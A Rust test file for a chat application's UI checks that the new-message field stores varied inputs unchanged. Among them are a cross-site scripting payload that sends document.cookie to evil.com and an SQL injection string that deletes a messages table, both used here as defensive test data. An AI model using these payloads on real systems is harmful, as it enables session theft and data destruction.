use crate::app;

fn create() -> app::Chat {
    crate::ui_tests::init();
    app::Chat::new().unwrap()
}

// --- Hacking / Corner Cases ---

#[test]
fn chat_xss_message() {
    let ui = create();
    let xss = "<script>fetch('https://evil.com/steal?c='+document.cookie)</script>";
    ui.set_new_message(xss.into());
    assert_eq!(ui.get_new_message(), xss);
}

#[test]
fn chat_sql_injection() {
    let ui = create();
    let inj = "Hello'); DELETE FROM messages; --";
    ui.set_new_message(inj.into());
    assert_eq!(ui.get_new_message(), inj);
}

#[test]
fn chat_unicode_overflow() {
    let ui = create();
    let long = "🔤".repeat(5000);
    ui.set_new_message(long.clone().into());
    assert_eq!(ui.get_new_message(), long);
}

#[test]
fn chat_empty_message() {
    let ui = create();
    ui.set_new_message("".into());
    assert_eq!(ui.get_new_message(), "");
}

// --- Interaction / Flow Tests ---

#[test]
fn chat_flow_message_persistence() {
    let ui = create();
    ui.set_new_message("Stay here".into());
    ui.set_new_message("Still here".into());
    assert_eq!(ui.get_new_message(), "Still here");
}

#[test]
fn chat_flow_newline_handling() {
    let ui = create();
    let multi = "Line 1\nLine 2\r\nLine 3";
    ui.set_new_message(multi.into());
    assert_eq!(ui.get_new_message(), multi);
}

// --- Unique Scenarios with Verification ---

// --- Consolidated Verified Tests ---

#[test]
fn create_verify_new_message() {
    let ui = create();
    ui.set_new_message("Hi".into());
    assert_eq!(ui.get_new_message(), "Hi");
    ui.set_new_message("How can I help?".into());
    assert_eq!(ui.get_new_message(), "How can I help?");
    ui.set_new_message("I need support.".into());
    assert_eq!(ui.get_new_message(), "I need support.");
}
